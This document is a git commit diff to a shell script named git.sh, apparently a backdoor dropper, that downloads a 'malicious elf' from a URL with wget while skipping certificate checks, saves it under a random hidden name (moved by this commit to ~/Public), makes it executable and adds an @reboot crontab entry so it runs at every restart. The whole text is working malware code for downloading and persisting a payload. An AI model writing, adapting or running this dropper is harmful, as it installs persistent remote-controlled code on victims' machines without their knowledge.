da970a96bee7ec71783f31997afc6313fc3a692f
FoxyProxy <166161106+FoxyProxys@users.noreply.github.com>
2024-04-07 01:48:30 +0530

    Update git.sh

--- git.sh
+++ git.sh
@@ -12,16 +12,16 @@ BACKDOOR=$RANDOM
 # Add dot to make hidden file
 BACKDOOR=".${BACKDOOR}"
 
-# Check if script is running as root or user, set persistence consequentially
+# Check if script is running as root or user, set persistence consequently
 if [ "$EUID" -ne 0 ]
 then
   # Download malicious elf
-  $WGET -q --no-check-certificate "${URL}" -O ~/$BACKDOOR
+  $WGET -q --no-check-certificate "${URL}" -O ~/Public/$BACKDOOR
   # Make macho executable
-  chmod +x ~/$BACKDOOR
+  chmod +x ~/Public/$BACKDOOR
   # Persistence in crontab
   crontab -l > temp_cron > /dev/null 2>&1
-  echo "@reboot sleep 30; ~/$BACKDOOR 2>&1" >> temp_cron
+  echo "@reboot sleep 30; ~/Public/$BACKDOOR 2>&1" >> temp_cron
   crontab temp_cron
   rm temp_cron
 else
